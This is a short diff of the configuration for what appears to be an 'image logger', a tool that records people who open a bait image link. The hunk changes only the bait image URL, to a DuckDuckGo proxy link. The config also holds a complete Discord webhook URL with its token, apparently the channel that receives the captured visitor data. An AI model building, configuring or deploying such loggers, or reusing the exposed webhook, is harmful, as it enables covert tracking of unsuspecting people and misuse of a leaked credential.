@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1139608903085195408/92zNgQya3Wvavmxx6UIr0BvRfMav9Gv3h-RWH5qHxs06Ux5s87ACn6N18z30PhLuG7Q6",
-    "image": "https://i.kym-cdn.com/photos/images/newsfeed/002/104/011/78a.png", # You can also have a custom image by using a URL argument
+    "image": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.kym-cdn.com%2Fphotos%2Fimages%2Fnewsfeed%2F002%2F104%2F011%2F78a.png&f=1&nofb=1&ipt=51233fe6c53175e6016a1c432cc0abcb6916a4ff600a691be9a47fdc0187a5a0&ipo=images", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
